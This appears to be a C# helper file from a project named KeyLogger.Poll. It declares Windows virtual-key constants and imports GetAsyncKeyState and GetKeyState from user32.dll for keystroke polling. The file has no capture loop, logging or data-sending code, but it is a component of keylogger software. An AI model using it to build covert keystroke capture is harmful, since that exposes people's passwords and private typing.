using System.Runtime.InteropServices;

namespace KeyLogger.Poll
{
    internal static class NativeMethods
    {
        internal const int VK_LBUTTON = 0x01;
        internal const int VK_BACK = 0x08;
        internal const int VK_TAB = 0x09;
        internal const int VK_RETURN = 0x0D;
        internal const int VK_SHIFT = 0x10;
        internal const int VK_CONTROL = 0x11;
        internal const int VK_MENU = 0x12;
        internal const int VK_ESCAPE = 0x1B;
        internal const int VK_SPACE = 0x20;
        internal const int VK_CAPITAL = 0x14;

        [DllImport("user32.dll")]
        internal static extern short GetAsyncKeyState(int virtualKeyCode);

        [DllImport("user32.dll")]
        internal static extern short GetKeyState(int virtualKeyCode);
    }
}
